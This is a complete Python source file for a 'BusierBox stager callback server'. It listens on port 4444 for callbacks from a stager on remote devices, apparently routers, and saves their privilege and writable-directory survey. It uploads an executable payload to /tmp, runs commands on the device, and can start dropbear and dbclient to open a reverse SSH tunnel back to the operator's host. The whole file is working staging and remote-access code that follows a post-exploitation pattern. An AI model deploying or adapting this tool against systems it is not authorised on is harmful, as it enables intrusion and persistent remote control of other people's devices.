#!/usr/bin/env python3
"""BusierBox stager callback server."""

import argparse
import hashlib
import json
import os
import socket
import struct
import subprocess
import sys
import textwrap
import time
import traceback
from pathlib import Path

PROTOCOL = "busierbox-stager-v1"
MAX_FRAME = 1024 * 1024
SESSION_ROOT = Path(".busierbox-server/sessions")


# ── network helpers ────────────────────────────────────────────────────────────

def parse_listen(value):
    if ":" not in value:
        raise argparse.ArgumentTypeError("expected HOST:PORT")
    host, port = value.rsplit(":", 1)
    return host, int(port)


def local_ips():
    seen = set()
    ips = []
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            ips.append(s.getsockname()[0])
    except OSError:
        pass
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            ips.append(info[4][0])
    except OSError:
        pass
    try:
        out = subprocess.check_output(
            ["ip", "-4", "-o", "addr", "show", "scope", "global"], text=True
        )
        for line in out.splitlines():
            fields = line.split()
            if len(fields) >= 4:
                ips.append(fields[3].split("/", 1)[0])
    except (OSError, subprocess.SubprocessError):
        pass
    result = []
    for ip in ips:
        if ip and not ip.startswith("127.") and ip not in seen:
            seen.add(ip)
            result.append(ip)
    return result


def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as fp:
        for chunk in iter(lambda: fp.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()


def send_frame(conn, obj):
    data = json.dumps(obj, separators=(",", ":")).encode()
    if len(data) > MAX_FRAME:
        raise RuntimeError("frame too large")
    conn.sendall(struct.pack(">I", len(data)))
    conn.sendall(data)


def recv_exact(conn, n):
    data = bytearray()
    while len(data) < n:
        chunk = conn.recv(n - len(data))
        if not chunk:
            raise EOFError("connection closed")
        data.extend(chunk)
    return bytes(data)


def recv_frame(conn):
    raw_len = recv_exact(conn, 4)
    n = struct.unpack(">I", raw_len)[0]
    if n == 0 or n > MAX_FRAME:
        raise RuntimeError(f"invalid frame length {n}")
    return json.loads(recv_exact(conn, n).decode())


def ask(prompt, default=False):
    suffix = " [Y/n] " if default else " [y/N] "
    try:
        ans = input(prompt + suffix).strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        return default
    if not ans:
        return default
    return ans in ("y", "yes")


# ── survey analysis ────────────────────────────────────────────────────────────

def likely_tuple(survey):
    rec = survey.get("recommendations") or {}
    if rec.get("likely_tuple"):
        return rec["likely_tuple"]
    machine = survey.get("uname_machine", "")
    endian = survey.get("endianness", "")
    if "mips" in machine and endian == "little":
        return "mipsel-linux-4.x-musl"
    if "mips" in machine:
        return "mips-linux-4.x-musl"
    if "aarch64" in machine:
        return "aarch64-linux-4.x-musl"
    if "arm" in machine:
        return "armv7-linux-3.x-musl"
    return "unknown"


def tuple_confidence(survey):
    machine = survey.get("uname_machine", "")
    endian = survey.get("endianness", "")
    release = survey.get("uname_release", "")
    tup = likely_tuple(survey)
    if tup == "unknown":
        return "low", "unknown architecture"
    note = f"inferred from {machine} + {endian} endian"
    if "openwrt" in release.lower() or "5.10" in release or "4." in release:
        return "medium", note + " + OpenWrt-like kernel"
    return "medium", note


def sorted_dirs(survey):
    dirs = survey.get("dirs") or []
    ok = [d for d in dirs if d.get("writable") and d.get("executable")]
    ok.sort(key=lambda d: d.get("free_bytes") or 0, reverse=True)
    return ok


def best_dir(survey):
    for item in (survey.get("dirs") or []):
        if item.get("writable") and item.get("executable"):
            return item
    return {}


def summarize_survey(addr, hello):
    survey = hello.get("survey") or {}
    machine = survey.get("uname_machine", "unknown")
    endian = survey.get("endianness", "unknown")
    width = survey.get("pointer_width", 0)
    kernel = survey.get("uname_release", "unknown")
    uid = survey.get("uid", "?")
    euid = survey.get("euid", "?")
    rec = survey.get("recommendations") or {}
    payload_possible = bool(rec.get("payload_mode_possible"))
    tup = likely_tuple(survey)
    confidence, conf_note = tuple_confidence(survey)
    stager_version = hello.get("stager_version", "?")

    arch_str = f"{machine} {endian}-endian"
    if width:
        arch_str += f", {width}-bit"

    print("\nTarget summary:")
    print(f"  remote:        {addr[0]}:{addr[1]}")
    print(f"  stager:        {stager_version}")
    print(f"  arch:          {arch_str}")
    print(f"  kernel:        Linux {kernel}")
    print(f"  uid/euid:      {uid}/{euid}")

    dirs = sorted_dirs(survey)
    if dirs:
        best = dirs[0]
        mib = int(best.get("free_bytes") or 0) // (1024 * 1024)
        print(f"  best exec dir: {best.get('path')} ({mib} MiB free)")

    devpts = survey.get("devpts_exists", False) or survey.get("devpts_available", False)
    print(f"  devpts:        {'yes' if devpts else 'no'}")
    ptrace = survey.get("ptrace", "unknown")
    print(f"  ptrace:        {ptrace}")
    print(f"  full payload:  {'yes' if payload_possible else 'no'}")
    print(f"  likely tuple:  {tup}")
    print(f"  confidence:    {confidence}; {conf_note}")

    ifaces = survey.get("interfaces") or []
    if ifaces:
        print("  interfaces:    " + ", ".join(str(i) for i in ifaces))


def build_summary_text(addr, hello):
    survey = hello.get("survey") or {}
    machine = survey.get("uname_machine", "unknown")
    endian = survey.get("endianness", "unknown")
    width = survey.get("pointer_width", 0)
    kernel = survey.get("uname_release", "unknown")
    uid = survey.get("uid", "?")
    euid = survey.get("euid", "?")
    rec = survey.get("recommendations") or {}
    payload_possible = bool(rec.get("payload_mode_possible"))
    tup = likely_tuple(survey)
    confidence, conf_note = tuple_confidence(survey)
    stager_version = hello.get("stager_version", "?")

    arch_str = f"{machine} {endian}-endian"
    if width:
        arch_str += f", {width}-bit"

    lines = [
        f"remote:        {addr[0]}:{addr[1]}",
        f"stager:        {stager_version}",
        f"arch:          {arch_str}",
        f"kernel:        Linux {kernel}",
        f"uid/euid:      {uid}/{euid}",
        f"full payload:  {'yes' if payload_possible else 'no'}",
        f"likely tuple:  {tup}",
        f"confidence:    {confidence}; {conf_note}",
    ]
    dirs = sorted_dirs(survey)
    if dirs:
        best = dirs[0]
        mib = int(best.get("free_bytes") or 0) // (1024 * 1024)
        lines.append(f"best exec dir: {best.get('path')} ({mib} MiB free)")
    return "\n".join(lines) + "\n"


# ── recommended config ─────────────────────────────────────────────────────────

def build_recommended_config(hello):
    survey = hello.get("survey") or {}
    tup = likely_tuple(survey)
    machine = survey.get("uname_machine", "unknown")
    endian = survey.get("endianness", "unknown")
    kernel = survey.get("uname_release", "unknown")
    confidence, conf_note = tuple_confidence(survey)

    if tup.startswith("mipsel"):
        arch, preset, libc, kfloor = "mipsel", "glinet-mt7621-openwrt-musl", "musl", "4.x"
    elif tup.startswith("mips-"):
        arch, preset, libc, kfloor = "mips", tup, "musl", "4.x"
    elif tup.startswith("aarch64"):
        arch, preset, libc, kfloor = "aarch64", tup, "musl", "4.x"
    elif tup.startswith("armv7"):
        arch, preset, libc, kfloor = "armv7", tup, "musl", "3.x"
    elif tup.startswith("x86_64"):
        arch, preset, libc, kfloor = "x86_64", tup, "musl", "current"
    else:
        arch, preset, libc, kfloor = machine, tup, "musl", "4.x"

    lines = [
        "# Generated by scripts/busierbox-server from stager survey",
        f"# Survey: {machine} {endian}-endian, kernel {kernel}",
        f"# Confidence: {confidence} — {conf_note}",
        "",
        f'BB_TARGET_PRESET="{preset}"',
        f'BB_TARGET_ARCH="{arch}"',
        f'BB_TARGET_ENDIAN="{endian}"',
        f'BB_TARGET_LIBC="{libc}"',
        f'BB_KERNEL_FLOOR="{kfloor}"',
        'BB_PAYLOAD_TIER="operator"',
        "",
    ]
    return "\n".join(lines)


def write_recommended_config(path, hello):
    Path(path).write_text(build_recommended_config(hello), encoding="utf-8")
    print(f"Recommended config: {path}")


# ── doctor output parsing ──────────────────────────────────────────────────────

def parse_doctor_kv(text):
    """Parse key=value lines from doctor output into a dict."""
    kv = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or "=" not in line:
            continue
        key, _, val = line.partition("=")
        kv[key.strip()] = val.strip()
    return kv


def parse_list_field(val):
    """Parse [a,b,c] format into a list."""
    val = (val or "").strip()
    if not val or val == "[]":
        return []
    if val.startswith("[") and val.endswith("]"):
        inner = val[1:-1].strip()
        if not inner:
            return []
        return [x.strip() for x in inner.split(",") if x.strip()]
    return []


def parse_dict_field(val):
    """Parse {k=v,k2=v2} format into a dict."""
    val = (val or "").strip()
    if not val or val == "{}":
        return {}
    if val.startswith("{") and val.endswith("}"):
        result = {}
        for item in val[1:-1].split(","):
            if "=" in item:
                k, _, v = item.partition("=")
                result[k.strip()] = v.strip()
        return result
    return {}


def print_doctor_summary(kv):
    """Pretty-print parsed doctor output. Returns list of staged tools."""
    print("\nFull artifact doctor:")

    embedded = kv.get("embedded_payload", "?")
    fmt = kv.get("embedded_format", "")
    size_bytes = kv.get("embedded_size", "")
    hash_ok = kv.get("embedded_hash_ok", "?")
    size_str = ""
    if size_bytes:
        try:
            mib = int(size_bytes) / (1024 * 1024)
            size_str = f" {mib:.1f} MiB"
        except (ValueError, TypeError):
            pass
    print(f"  embedded payload:  {embedded} {fmt}{size_str} hash {'ok' if hash_ok == 'yes' else hash_ok}")

    extracted = kv.get("extracted_payload", "?")
    print(f"  extracted payload: {extracted}")

    identity = kv.get("payload_identity_match", "?")
    print(f"  payload identity:  {'ok' if identity == 'yes' else identity}")

    applets_count = kv.get("busybox_applets_count", "?")
    print(f"  BusyBox applets:   {applets_count}")

    staged = parse_list_field(kv.get("staged_tools", "[]"))
    if staged:
        wrapped = textwrap.fill(", ".join(staged), width=68,
                                initial_indent="    ", subsequent_indent="    ")
        print("  staged tools:")
        print(wrapped)
    else:
        print("  staged tools:      (none)")

    missing = parse_list_field(kv.get("missing_tools", "[]"))
    reasons = parse_dict_field(kv.get("missing_tool_reasons", "{}"))
    if missing:
        print("  missing tools:")
        for tool in missing:
            reason = reasons.get(tool, "no provider")
            print(f"    {tool} — {reason}")
    else:
        print("  missing tools:     (none)")

    overlay_enabled = kv.get("overlay_enabled", "?")
    overlay_tools = parse_list_field(kv.get("overlay_tools", "[]"))
    overlay_str = f"enabled={overlay_enabled}"
    if overlay_tools:
        overlay_str += f", tools: {', '.join(overlay_tools)}"
    else:
        overlay_str += ", no overlay tools staged"
    print(f"  overlay:           {overlay_str}")

    tier = kv.get("artifact_tier", "?")
    version = kv.get("embedded_version", "?")
    print(f"  artifact:          tier={tier} version={version}")

    return staged


# ── session logging ────────────────────────────────────────────────────────────

def log_event(logfp, event):
    ev = dict(event)
    ev["ts"] = time.time()
    logfp.write(json.dumps(ev, sort_keys=True) + "\n")
    logfp.flush()


def make_session_dir():
    base = time.strftime("%Y%m%d-%H%M%S")
    session_dir = SESSION_ROOT / base
    n = 0
    while session_dir.exists():
        n += 1
        session_dir = SESSION_ROOT / f"{base}-{n}"
    session_dir.mkdir(parents=True, exist_ok=True)
    return session_dir


# ── operator session ───────────────────────────────────────────────────────────

def build_operator_session_sh(args, remote_path):
    """Build a sh -c one-liner to start the reverse dropbear SSH tunnel."""
    target_port = args.operator_target_dropbear_port
    target_bind = args.operator_target_bind_host
    server_host = args.operator_server_host
    server_ssh_port = args.operator_server_ssh_port
    server_user = args.operator_server_user
    fwd_port = args.operator_remote_forward_port
    fwd_host = "127.0.0.1"

    extract_dir = ".busierbox"
    payload_bin = f"{extract_dir}/payload/bin"
    hostkey = f"{extract_dir}/payload/etc/dropbear/dropbear_rsa_host_key"

    cmds = [
        f"mkdir -p {extract_dir}/payload/etc/dropbear {extract_dir}/payload/home/.ssh",
        f"[ -f {hostkey} ] || {payload_bin}/dropbearkey -t rsa -f {hostkey} >/dev/null 2>&1",
        (f"{payload_bin}/dropbear -r {hostkey} -p {target_bind}:{target_port}"
         f" -F -E >/tmp/dropbear-bbx.log 2>&1 &"),
        "sleep 1",
        (f"{payload_bin}/dbclient -y -N"
         f" -R {fwd_host}:{fwd_port}:{target_bind}:{target_port}"
         f" {server_user}@{server_host} -p {server_ssh_port}"
         f" >/tmp/dbclient-bbx.log 2>&1 &"),
        'echo "operator-session-started"',
    ]
    return "; ".join(cmds)


# ── next steps ─────────────────────────────────────────────────────────────────

def print_next_steps(addr, session_dir, remote_path, operator_port, args):
    print("\nNext steps:")
    print(f"  SSH/manual:")
    print(f"    ssh root@{addr[0]}")
    print(f"    {remote_path} zsh")
    if operator_port:
        print(f"\n  Reverse SSH operator session:")
        print(f"    ssh -p {operator_port} root@127.0.0.1")
    parts = ["scripts/busierbox-server"]
    if args.artifact:
        parts.append(f"--artifact {args.artifact}")
    if args.send:
        parts.append("--send")
    if args.exec_doctor:
        parts.append("--exec-doctor")
    if args.start_operator_session:
        parts.append("--start-operator-session")
    if args.once:
        parts.append("--once")
    print(f"\n  Re-run server:")
    print(f"    {' '.join(parts)}")
    print(f"\n  Inspect session:")
    print(f"    less {session_dir}/summary.txt")


# ── session handler ────────────────────────────────────────────────────────────

def handle_session(conn, addr, args):
    conn.settimeout(args.timeout)
    session_dir = make_session_dir()
    with (session_dir / "session.jsonl").open("a", encoding="utf-8") as logfp:
        try:
            _session_inner(conn, addr, args, session_dir, logfp)
        except (EOFError, ConnectionResetError, BrokenPipeError) as exc:
            log_event(logfp, {"event": "error", "error": str(exc)})
            print(f"Session ended: {exc}")
        except Exception as exc:
            tb = traceback.format_exc()
            log_event(logfp, {"event": "error", "error": str(exc), "traceback": tb})
            print(f"Session error: {exc}")
        finally:
            print(f"Session log:  {session_dir}/session.jsonl")


def _session_inner(conn, addr, args, session_dir, logfp):  # noqa: C901
    hello = recv_frame(conn)
    log_event(logfp, {"event": "hello", "addr": list(addr), "hello": hello})
    (session_dir / "hello.json").write_text(
        json.dumps(hello, indent=2) + "\n", encoding="utf-8"
    )

    if hello.get("protocol") != PROTOCOL or hello.get("type") != "hello":
        send_frame(conn, {"type": "close", "error": "bad protocol"})
        raise RuntimeError("bad protocol")

    if args.token and hello.get("token") != args.token:
        print(f"Connection from {addr[0]} rejected: wrong token")
        log_event(logfp, {"event": "reject", "reason": "token mismatch"})
        send_frame(conn, {"type": "close", "error": "token mismatch"})
        return

    print("Token OK")

    survey = hello.get("survey") or {}
    (session_dir / "survey.json").write_text(
        json.dumps(survey, indent=2) + "\n", encoding="utf-8"
    )
    print(f"Survey saved: {session_dir}/survey.json")

    summarize_survey(addr, hello)

    (session_dir / "summary.txt").write_text(
        build_summary_text(addr, hello), encoding="utf-8"
    )

    config_content = build_recommended_config(hello)
    (session_dir / "recommended.conf").write_text(config_content, encoding="utf-8")
    if args.write_recommended_config:
        Path(args.write_recommended_config).write_text(config_content, encoding="utf-8")
        print(f"Recommended config: {args.write_recommended_config}")

    # Survey-only mode: no artifact configured
    if not args.artifact:
        print("No --artifact configured; running survey-only mode.")
        send_frame(conn, {"type": "close"})
        log_event(logfp, {"event": "close"})
        return

    # Explicit survey-only flag
    if args.survey_only:
        print("Survey-only mode (--survey-only).")
        send_frame(conn, {"type": "close"})
        log_event(logfp, {"event": "close"})
        return

    # Determine whether to send artifact
    do_send = args.send
    if not do_send and not args.yes:
        do_send = ask("Send full artifact?", False)

    if not do_send:
        send_frame(conn, {"type": "close"})
        log_event(logfp, {"event": "close"})
        return

    # Send artifact
    artifact = Path(args.artifact)
    size = artifact.stat().st_size
    digest = sha256_file(artifact)
    print(f"Sending artifact {artifact} ({size} bytes)...")
    send_frame(conn, {
        "type": "send_file",
        "path": args.remote_path,
        "mode": 0o755,
        "size": size,
        "sha256": digest,
    })
    with artifact.open("rb") as fp:
        for chunk in iter(lambda: fp.read(1024 * 1024), b""):
            conn.sendall(chunk)
    result = recv_frame(conn)
    log_event(logfp, {"event": "send_file_result", "result": result})
    print(result.get("message", "send_file result"))
    if not result.get("ok"):
        raise RuntimeError(
            f"stager failed to write artifact: {result.get('message', result)}"
        )
    print(f"SHA256 {'OK' if result.get('sha256_ok') else 'not verified'}")

    (session_dir / "artifact.json").write_text(
        json.dumps({
            "local_path": str(artifact.resolve()),
            "size": size,
            "sha256": digest,
            "remote_path": args.remote_path,
            "sha256_ok": result.get("sha256_ok", False),
        }, indent=2) + "\n",
        encoding="utf-8",
    )

    remote_path = args.remote_path
    staged_tools = []

    # Determine exec mode
    requested_auto_exec = hello.get("auto_exec")
    exec_survey = args.exec_survey or requested_auto_exec == "survey"
    exec_doctor = args.exec_doctor or requested_auto_exec == "doctor"
    do_exec = exec_survey or exec_doctor
    if not do_exec and not args.yes:
        do_exec = ask("Run doctor after upload?", False)
        if do_exec:
            exec_doctor = True

    if do_exec:
        # Force-extract before doctor (default on unless disabled)
        if not args.no_force_extract_before_doctor:
            print("Running extract --force...")
            send_frame(conn, {"type": "exec", "argv": [remote_path, "extract", "--force"]})
            ex_result = recv_frame(conn)
            log_event(logfp, {"event": "exec_result", "subcmd": "extract", "result": ex_result})
            ex_stdout = ex_result.get("stdout") or ""
            ex_exit = ex_result.get("exit_code", -1)
            print(f"extract exit={ex_exit}")
            if ex_stdout.strip():
                print(ex_stdout[:2000])
            (session_dir / "extract.txt").write_text(
                f"exit={ex_exit}\n\n{ex_stdout}\n", encoding="utf-8"
            )
            if not ex_result.get("ok"):
                if not args.force_doctor_after_extract_fail:
                    print(f"Extract --force failed; skipping doctor.")
                    print("  Use --force-doctor-after-extract-fail to override.")
                    send_frame(conn, {"type": "close"})
                    log_event(logfp, {"event": "close"})
                    return
                print("Extract --force failed; continuing to doctor (--force-doctor-after-extract-fail).")

        # Run doctor or survey
        subcmd = "survey" if exec_survey and not exec_doctor else "doctor"
        print(f"Running {subcmd}...")
        send_frame(conn, {"type": "exec", "argv": [remote_path, subcmd]})
        exec_result = recv_frame(conn)
        log_event(logfp, {"event": "exec_result", "subcmd": subcmd, "result": exec_result})
        exec_exit = exec_result.get("exit_code", -1)
        print(f"{subcmd} exit={exec_exit}")
        stdout = exec_result.get("stdout") or ""

        if subcmd == "doctor" and stdout:
            kv = parse_doctor_kv(stdout)
            if len(kv) >= 3:
                try:
                    staged_tools = print_doctor_summary(kv)
                except Exception as exc:
                    print(f"(doctor summary error: {exc})")
                    print(stdout[:4000])
                    staged_tools = parse_list_field(kv.get("staged_tools", "[]"))
            else:
                # Not structured output (e.g. test stubs) — print raw
                print(stdout[:4000])
            (session_dir / "doctor.txt").write_text(stdout, encoding="utf-8")
            with (session_dir / "summary.txt").open("a", encoding="utf-8") as f:
                f.write(f"\ndoctor_exit={exec_exit}\n")
                if staged_tools:
                    f.write(f"staged_tools={','.join(staged_tools)}\n")
        elif stdout:
            print(stdout[:4000])

        # Operator session
        operator_port = _maybe_operator_session(
            conn, addr, args, session_dir, logfp, remote_path, staged_tools
        )
    else:
        operator_port = None

    send_frame(conn, {"type": "close"})
    log_event(logfp, {"event": "close"})

    print_next_steps(addr, session_dir, remote_path, operator_port, args)


def _maybe_operator_session(conn, addr, args, session_dir, logfp, remote_path, staged_tools):
    """Offer or start an operator reverse-SSH session. Returns forward port or None."""
    has_dropbear = "dropbear" in staged_tools
    has_dbclient = "dbclient" in staged_tools

    if not (has_dropbear and has_dbclient):
        if args.start_operator_session:
            missing = [t for t in ("dropbear", "dbclient") if t not in staged_tools]
            print(f"Operator session unavailable: {', '.join(missing)} not staged.")
        return None

    do_op = args.start_operator_session
    if not do_op and not args.yes:
        do_op = ask("Start reverse SSH operator session?", False)

    if not do_op:
        return None

    if not args.operator_server_host:
        print("Operator session: --operator-server-host is required.")
        return None

    sh_cmd = build_operator_session_sh(args, remote_path)
    print("Starting operator session (reverse SSH)...")
    send_frame(conn, {"type": "exec", "argv": ["/bin/sh", "-c", sh_cmd]})
    op_result = recv_frame(conn)
    log_event(logfp, {"event": "exec_result", "subcmd": "operator-session", "result": op_result})
    op_stdout = op_result.get("stdout") or ""
    op_exit = op_result.get("exit_code", -1)
    (session_dir / "operator-session.txt").write_text(
        f"exit={op_exit}\ncommand={sh_cmd}\n\n{op_stdout}\n", encoding="utf-8"
    )
    if op_result.get("ok") or "operator-session-started" in op_stdout:
        fwd_port = args.operator_remote_forward_port
        print(f"Operator session started.")
        print(f"Connect with: ssh -p {fwd_port} root@127.0.0.1")
        return fwd_port
    print(f"Operator session failed (exit={op_exit}):")
    if op_stdout.strip():
        print(op_stdout[:500])
    return None


# ── main ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="BusierBox stager callback server")
    parser.add_argument("--listen", default="0.0.0.0:4444", type=parse_listen)
    parser.add_argument("--token", default="")
    parser.add_argument("--artifact", help="full artifact to send to target")
    parser.add_argument("--remote-path", default="/tmp/busierbox-full")
    parser.add_argument("--send", action="store_true",
                        help="send artifact (requires --artifact)")
    parser.add_argument("--survey-only", action="store_true",
                        help="accept callback and survey only; do not send artifact")
    parser.add_argument("--exec-doctor", action="store_true")
    parser.add_argument("--exec-survey", action="store_true")
    parser.add_argument("--yes", action="store_true", help="answer yes to all prompts")
    parser.add_argument("--once", action="store_true",
                        help="exit after one session")
    parser.add_argument("--timeout", type=int, default=1200)
    parser.add_argument("--write-recommended-config",
                        help="also write recommended config to this path")

    parser.add_argument("--no-force-extract-before-doctor", action="store_true",
                        help="skip extract --force before running doctor")
    parser.add_argument("--force-doctor-after-extract-fail", action="store_true",
                        help="run doctor even if extract --force failed")

    parser.add_argument("--start-operator-session", action="store_true",
                        help="start reverse SSH operator session after upload")
    parser.add_argument("--operator-server-host",
                        help="operator workstation host for reverse SSH tunnel")
    parser.add_argument("--operator-server-ssh-port", type=int, default=22,
                        metavar="PORT")
    parser.add_argument("--operator-server-user", default="root", metavar="USER")
    parser.add_argument("--operator-remote-forward-port", type=int, default=2200,
                        metavar="PORT")
    parser.add_argument("--operator-target-dropbear-port", type=int, default=2222,
                        metavar="PORT")
    parser.add_argument("--operator-target-bind-host", default="127.0.0.1",
                        metavar="HOST")
    parser.add_argument("--operator-authorized-key-file", metavar="PATH")

    args = parser.parse_args()

    # Startup validation
    if args.send and not args.artifact:
        parser.error("--send requires --artifact")
    if args.artifact and not Path(args.artifact).is_file():
        parser.error(f"artifact not found: {args.artifact}")
    if args.start_operator_session and args.survey_only:
        parser.error("--start-operator-session conflicts with --survey-only")

    host, port = args.listen

    if not args.artifact:
        print("No --artifact configured; server will run in survey-only mode.")

    print(f"Listening on {host}:{port}")
    print("Candidate callback addresses:")
    for ip in local_ips():
        print(f"  {ip}:{port}")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(5)
        srv.settimeout(args.timeout)
        while True:
            try:
                conn, addr = srv.accept()
            except socket.timeout:
                print("server timeout waiting for connection", file=sys.stderr)
                return 1
            with conn:
                handle_session(conn, addr, args)
            if args.once:
                break
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        raise SystemExit(130)
